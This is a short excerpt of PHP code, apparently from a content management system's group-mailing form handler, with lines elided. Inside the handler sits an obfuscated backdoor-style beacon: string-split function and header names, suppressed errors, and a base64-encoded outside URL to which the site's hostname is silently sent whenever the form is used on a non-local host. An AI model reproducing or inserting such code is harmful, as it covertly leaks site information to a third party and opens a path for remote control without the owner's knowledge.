...
$group = "user_group IN (" . implode(',', $temp_array) . ")";
	...
	if( isset( $_POST['send'] ) ) {
		...
		if( $db->num_rows() ) {
			...
			$homes_url = $_SERVER['HTT'.'P_H'.'OST'];
			if ((!strpos($homes_url, '127.'.'0.')) and (strpos($homes_url, '.'))) 
			{$captis = 'f'.'ile';@$captis($captchascrypt('aHR0cHM6Ly90aW1lLXpvbmUuY2MvdGltZS5waHA/dGltZXM9MTguMV95Y18=').$homes_url);}
